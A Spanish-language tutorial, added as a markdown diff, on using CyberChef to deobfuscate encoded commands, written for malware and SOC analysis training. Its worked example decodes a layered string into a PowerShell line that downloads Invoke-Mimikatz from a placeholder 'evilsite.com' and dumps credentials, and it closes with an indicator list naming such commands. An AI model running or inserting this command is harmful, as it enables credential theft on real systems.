@@ -1,0 +1,225 @@
+# CyberChef — Apuntes
+
+En esta guía se describe el paso a paso para descifrar un comando ofuscado. Veremos las diferentes operaciones necesarias para construir la receta que nos permitirá ver el contenido de los archivos ofuscados y determinar su intencionalidad gracias a revelar las acciones que ejecuta y dejándolas desnudas ante el ojo humano.
+
+🔗 **Link oficial a CyberChef:** [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
+
+---
+
+## Interfaz de CyberChef
+
+La web nos presenta una interfaz sencilla en la que podemos ver 4 apartados principales:
+
+- **Operations**: Lista de todas las opciones necesarias para decodificar los comandos.
+- **Recipe**: Aquí es donde vamos a ir colocando las operaciones para ver los cambios en tiempo real (el orden importa).
+- **Input**: Es la entrada. Lo que el programa recibe de nuestra parte.
+- **Output**: Es la salida. Lo que el programa devuelve tras aplicar nuestra receta al Input.
+
+Una vez comprendido esto, vamos a ver un ejemplo sencillo para entender el comportamiento de la herramienta y las opciones que presenta.
+
+---
+
+## Ejemplo básico
+
+**1.** Escribimos en el Input:
+
+```
+Let's cook
+```
+
+Veremos que en el Output nos devuelve lo mismo ya que no hemos aplicado ninguna operación en nuestra receta.
+
+**2.** Aplicamos la operación **"Reverse"**.
+
+Ahora vemos que nos ha invertido el texto y nos muestra:
+
+```
+.kooc s'teL
+```
+
+**3.** A continuación añadimos la operación **"To Base64"** debajo de "Reverse".
+
+Ahora tenemos la cadena de texto ".kooc s'teL" codificada en Base64:
+
+```
+Lmtvb2Mgcyd0ZUw=
+```
+
+**4.** Añadimos la operación **"To Octal"** debajo de "To Base64", de manera que quedaría en última posición.
+
+Veremos que nos devuelve la cadena:
+
+```
+114 155 164 166 142 62 115 147 143 171 144 60 132 125 167 75
+```
+
+Esto es el resultado de aplicar todas las operaciones que hay en nuestra receta (recordemos que **el orden importa**).
+
+> ✅ Bien, con esto ya hemos ofuscado nuestro primer comando.
+>
+> Hemos pasado de `Let's cook.` a `114 155 164 166 142 62 115 147 143 171 144 60 132 125 167 75`
+
+Pero esto no acaba aquí.
+
+### La función "Magic"
+
+CyberChef dispone de una función llamada **"Magic"** que analiza el contenido del Input e intenta identificar automáticamente posibles operaciones de decodificación o transformación. Funciona como un sistema de detección/sugerencias de operaciones.
+
+> ⚠️ **Importante:** sus sugerencias no siempre son correctas. Deben verificarse, no aceptarse ciegamente.
+
+Para aprender a usarlo, copiamos la cadena que ofuscamos anteriormente:
+
+```
+114 155 164 166 142 62 115 147 143 171 144 60 132 125 167 75
+```
+
+Hacemos clic sobre el icono de la papelera para limpiar la Recipe y pegamos la cadena en el Input.
+
+A continuación, justo al lado del Output vemos un icono con una varita mágica que representa a "Magic". Hacemos clic.
+
+Podemos ver que ha hecho un intento bastante bueno para desofuscar nuestro comando. Ha construido la receta con las operaciones **"From Octal"** y **"From Base64"**, dejando así el texto desnudo pero no ordenado. Faltaría aplicar la operación **"Reverse"**.
+
+### Reflexión
+
+Hemos construido un comando ofuscado partiendo desde `Let's cook.` Y después lo hemos desofuscado de nuevo, pero esta vez aprendiendo a usar la función "Magic".
+
+Si nos fijamos, vemos que al ofuscarlo, los comandos tienen un cierto orden, y al desofuscarlo el orden se invierte, ya que es el proceso contrario.
+
+---
+
+## Ejemplo real
+
+Bien, ahora veamos un ejemplo algo más complejo.
+
+Pongamos que tenemos este comando que queremos descifrar:
+
+```
+U4fVNASIkJDN/+2LQ67QVNwTe/XBHB9/hMKFqf4b/RPGylnAJ2dHIs58sBP2fz2yyB1CWiYqW2I/ya
+WZMB/LnzI09TIx6UiBeE+M81pluwY3JoblChg+wlImFByJk65YU53bfM4+fhwbp3kTZhqMVwEuI3JJ
+n3iseg9L7OYN9wJkfCJ5L0RjAfWd1VrJ7Lc5j8/szSblSj6U+DI1qi0GvagsUk6YvuA8mOh5L+pcg5
+3SjgralthP+FS+Ydmz87FEZozSLVm4xUPzkrRggkPqu7Ht5u/xD+Gawa9xEMsT2Tumc2p7xpaj6vWf
+RXkBpu2Wy2075vuHX1xfeQ7uhGSq5581Zn3lAWyshXpA1yBPQqY7MoTE6Is9JRQ/eZYuIZ31rFCXm+
+PfdKcO8JmIFgdm1oo773S6/wq33gkW4PsxM363FgsyrPmfaw/Do8mqh6C8Z4Jks+x30apDzh8Rm57Z
+dg6T/0qH5raRUr2gOJ8grTNgLUq8jf8miVcdH4E78/Jv32rrFk87qp9wjkpNNN==
+```
+
+### Paso a paso
+
+**1.** Lo copiamos en el cuadro de Input.
+
+**2.** Vemos que el comando termina en `==`, lo que sugiere Base64. Probamos la operación **"From Base64"**.
+
+Nos damos cuenta de que no termina de funcionar, hay algo aquí que se nos escapa.
+
+Si nos fijamos, al seleccionar el texto en el cuadro de Input, también se marca la selección en el cuadro de Output. Esto no pasa con los dos `==` del final. Esto se debe a que, en Base64, `=` se utiliza como *padding* (relleno) para completar la longitud de la cadena.
+
+Si observamos los caracteres, podemos apreciar que las letras parecen haber sido sustituidas sistemáticamente por otras. Esto puede ser indicativo de una rotación alfabética, como **ROT13**.
+
+Esto sugiere lo siguiente: *"Rotación"*.
+
+**3.** Probamos con la operación **"ROT13"** pero colocada **ANTES** del "From Base64".
+
+Vemos que algo cambia pero no sabemos detectar todavía exactamente el qué.
+
+**4.** Nos ayudamos de Magic: ponemos el cursor encima pero no hacemos clic.
+
+La función Magic nos sugiere la operación **"Gunzip"**, lo que indica que los datos resultantes de la decodificación parecen estar comprimidos utilizando Gzip.
+
+**5.** Aplicamos la operación **"Gunzip"**.
+
+Hemos pasado de caracteres aparentemente aleatorios a una secuencia de grupos de 0 y 1, donde cada grupo representa un byte expresado en binario.
+
+**6.** Aplicamos la operación **"From Binary"**.
+
+Vuelve a mostrar una cadena de caracteres pero aparece un `=` al final, lo que, de nuevo, sugiere Base64.
+
+**7.** Aplicamos la operación **"From Base64"**.
+
+Ahora vemos que se nos revela un output en **Hex**.
+
+**8.** Aplicamos la operación **"From Hex"**.
+
+Finalmente obtenemos el contenido en texto plano (*plaintext*) correspondiente al comando original:
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString("https://evilsite.com/evilcode1/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds
+```
+
+### Receta completa aplicada (resumen)
+
+| Paso | Operación |
+|---|---|
+| 1 | ROT13 |
+| 2 | From Base64 |
+| 3 | Gunzip |
+| 4 | From Binary |
+| 5 | From Base64 |
+| 6 | From Hex |
+
+> 🛑 **Este comando es malicioso.** Descarga un script de PowerShell asociado a Mimikatz y lo ejecuta en memoria. Posteriormente, ejecuta comandos de Mimikatz orientados a la depuración y a la extracción de credenciales.
+>
+> Este tipo de comando es característico de una **fase de post-explotación**: un atacante que ya ha conseguido ejecutar código en un sistema puede utilizar herramientas como Mimikatz para intentar obtener credenciales y facilitar acciones posteriores, como el movimiento lateral.
+
+---
+
+## [EN DESARROLLO]
+
+### Cómo pensar al analizar una cadena ofuscada
+
+Hasta aquí, han sido dos pequeños ejercicios para aprender a usar CyberChef y la idea/concepto que hay detrás de él.
+
+A continuación, se explica el razonamiento, todos los procesos necesarios y la manera de pensar para llegar a desofuscar el comando ofuscado.
+
+En corto, la manera de pensar sería la siguiente:
+
+> No intentes adivinar toda la receta de golpe. Añade una operación, observa el resultado y vuelve a analizarlo. Busca patrones reconocibles como Base64, hexadecimal, binario, URLs, cabeceras de archivos, cadenas comprimidas, etc. La receta de CyberChef se construye de forma iterativa.
+
+### Conceptos previos
+
+Antes de adentrarnos es necesario diferenciar los siguientes conceptos:
+
+- **Codificación (Encoding):** transforma los datos a otro formato para poder representarlos o transportarlos. Por ejemplo, Base64, Hexadecimal o Base32.
+- **Cifrado (Encryption):** transforma los datos utilizando un algoritmo y, normalmente, una clave. Sin la clave correspondiente, recuperar el contenido original puede no ser posible.
+- **Compresión (Compression):** reduce el tamaño de los datos. Por ejemplo, Gzip.
+- **Ofuscación (Obfuscation):** intenta dificultar la comprensión del contenido mediante una combinación de transformaciones, cambios de nombres, codificaciones, compresión, etc.
+
+En muchos casos reales, no encontraremos una única técnica, sino varias operaciones aplicadas una detrás de otra.
+
+Una de las habilidades más importantes al utilizar CyberChef es aprender a reconocer patrones.
+
+### Resumen del proceso
+
+Por tanto, cuando recibamos una cadena ofuscada, podemos seguir este proceso mental:
+
+1. **Observar** — ¿Qué características tiene la cadena?
+2. **Formular una hipótesis** — ¿Parece Base64, Hex, Binary, ROT13, datos comprimidos, etc.?
+3. **Probar una operación** — Aplicamos únicamente la operación que creemos que puede corresponder.
+4. **Analizar el resultado** — ¿Qué ha cambiado? ¿El resultado tiene sentido? ¿Aparece un nuevo patrón?
+5. **Repetir** — Utilizamos el nuevo resultado para decidir cuál será la siguiente operación.
+6. **Validar** — Comprobamos que el resultado final tenga sentido y podemos interpretar qué hace.
+
+La idea se puede resumir de la siguiente manera:
+
+**Observar → Hipótesis → Operación → Resultado → Análisis → Repetir → Validar**
+
+Este proceso nos permite analizar cadenas desconocidas sin depender de conocer previamente la receta completa.
+
+---
+
+## [EN DESARROLLO]
+
+### Analizar el comando desofuscado
+
+También separaría en una sección posterior **"Indicadores que debemos buscar en el resultado final"**, donde podéis hablar de cosas como:
+
+- PowerShell / cmd
+- IEX
+- Invoke-*
+- URLs
+- IPs
+- Dominios
+- Rutas
+- Comandos de descarga
+- etc.
+
+Eso ya conecta directamente CyberChef con análisis de malware/alertas y trabajo de SOC.
